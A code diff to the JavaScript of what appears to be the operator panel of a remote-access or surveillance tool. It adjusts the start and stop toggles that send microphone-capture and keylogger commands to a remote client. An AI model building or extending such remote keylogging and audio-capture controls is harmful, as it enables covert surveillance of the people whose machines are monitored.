@@ -873,40 +873,35 @@
     // ─── Microphone ────────────────────────────────────────────────
     function toggleMic() {
         if (APP.micActive) {
+            // Stop: optimistic toggle (safe, idempotent)
             emitToClient('mic_stop');
-            // Optimistic toggle (don't wait for status response)
             APP.micActive = false;
             document.getElementById('mic-toggle-btn').textContent = '▶ Start Mic';
             document.getElementById('mic-toggle-btn').classList.remove('active-stream');
             document.getElementById('mic-status-text').textContent = 'Idle';
             document.getElementById('mic-meter').style.display = 'none';
             document.getElementById('mic-placeholder').style.display = '';
+            if (APP._micAudioCtx) { APP._micAudioCtx.close(); APP._micAudioCtx = null; }
         } else {
+            // Start: wait for status response (no optimistic toggle)
             emitToClient('mic_start');
-            APP.micActive = true;
-            document.getElementById('mic-toggle-btn').textContent = '⏸ Stop Mic';
-            document.getElementById('mic-toggle-btn').classList.add('active-stream');
-            document.getElementById('mic-status-text').textContent = '🔴 Connecting...';
-            document.getElementById('mic-meter').style.display = 'block';
-            document.getElementById('mic-placeholder').style.display = 'none';
+            document.getElementById('mic-status-text').textContent = '⏳ Starting...';
         }
     }
 
     // ─── Keylogger ─────────────────────────────────────────────────
     function toggleKeylog() {
         if (APP.keylogActive) {
+            // Stop: optimistic toggle (safe, idempotent)
             emitToClient('keylog_stop');
-            // Optimistic toggle
             APP.keylogActive = false;
             document.getElementById('keylog-toggle-btn').textContent = '▶ Start';
             document.getElementById('keylog-toggle-btn').classList.remove('active-stream');
             document.getElementById('keylog-status-text').textContent = 'Stopped';
         } else {
+            // Start: wait for status response
             emitToClient('keylog_start');
-            APP.keylogActive = true;
-            document.getElementById('keylog-toggle-btn').textContent = '⏸ Stop';
-            document.getElementById('keylog-toggle-btn').classList.add('active-stream');
-            document.getElementById('keylog-status-text').textContent = '🔴 Capturing';
+            document.getElementById('keylog-status-text').textContent = '⏳ Starting...';
         }
     }
     function clearKeylog() {
